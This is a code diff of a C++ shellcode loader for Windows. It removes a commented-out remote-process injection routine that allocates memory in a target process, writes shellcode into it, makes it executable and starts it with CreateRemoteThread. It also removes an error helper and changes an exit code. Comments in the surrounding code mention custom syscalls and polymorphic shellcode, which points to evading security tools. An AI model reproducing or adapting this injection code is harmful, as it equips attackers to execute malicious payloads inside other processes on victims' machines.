@@ -120,7 +120,7 @@ void run(unsigned char* sc, size_t scLen) {
 	SIZE_T bytesWritten = 0;
 	ULONG oldProtectOption = 0;
 
-	
+
 
 	// SWITCH DEPENDING ON THE EXECUTION MODE
 	// TODO: COULD USE CUSTOM SYSCALLS FOR THESE TOO, BUT IT'S COMPLEX TO CREATE A NEW PROCESS BECAUSE I NEED TO CREATE A NEW SECTION TO EXECUTE AND ALL THAT
@@ -203,78 +203,5 @@ void run(unsigned char* sc, size_t scLen) {
 
 	NtClose(processHandle);
 
-	exit(1337);
-
-	//////////////////////////////////////////////////////////////////////////
-	// 	  OLD STUFF BELOW HERE
-	//////////////////////////////////////////////////////////////////////////// 
-	/*
-	// ALLOCATE SPACE INSIDE THE REMOTE PROCESS
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, scLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-	if (!remoteBuffer) {
-		if (DEBUG_MODE) cout << "Failed to create remote buffer in target process" << endl;
-		exit(5);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Allocating space (readwrite) succeeded!" << endl;
-	}
-
-	// WRITE PROCESS MEMORY
-	success = WriteProcessMemory(processHandle, remoteBuffer, sc, scLen, NULL);
-	if (!success) {
-		if (DEBUG_MODE) cout << "Failed to write process memory" << endl;
-		exit(6);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Write Process Memory succeeded!" << endl;
-	}
-
-	PDWORD oldProtectOption = new DWORD();
-	*oldProtectOption = PAGE_READWRITE;
-
-	// IMPORTANT! IF YOUR SHELLCODE IS POLYMORPHIC OR OTHERWISE SELF-MODIFYING THEN YOU NEED TO SWITCH "PAGE_EXECUTE" WITH "PAGE_READWRITE"
-	success = VirtualProtectEx(processHandle, remoteBuffer, scLen, PAGE_EXECUTE, oldProtectOption);
-	if (!success) {
-		if (DEBUG_MODE) cout << "Failed to change memory protection to execute only" << endl;
-	}
-	else {
-		if (DEBUG_MODE) cout << "Successfully changed memory protection to execute only" << endl;
-	}
-
-
-	// CREATE THREAD AND EXECUTE
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-	if (!remoteThread) {
-		if (DEBUG_MODE) cout << "Failed to create remote thread" << endl;
-		exit(7);
-	}
-	else {
-		if (DEBUG_MODE) cout << "Successfully created and executing thread in remote thread in" << endl;
-	}
-
-	CloseHandle(processHandle);
-	*/
-}
-
-void DisplayError(DWORD NTStatusMessage)
-{
-	LPVOID lpMessageBuffer;
-	HMODULE Hand = LoadLibrary(L"ntdll.dll");
-
-	FormatMessage(
-		FORMAT_MESSAGE_ALLOCATE_BUFFER |
-		FORMAT_MESSAGE_FROM_SYSTEM |
-		FORMAT_MESSAGE_FROM_HMODULE,
-		Hand,
-		NTStatusMessage,
-		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-		(LPTSTR)&lpMessageBuffer,
-		0,
-		NULL);
-
-	// Now display the string.
-	cout << "Error: " << lpMessageBuffer << endl;
-	// Free the buffer allocated by the system.
-	LocalFree(lpMessageBuffer);
-	FreeLibrary(Hand);
+	exit(0);
 }
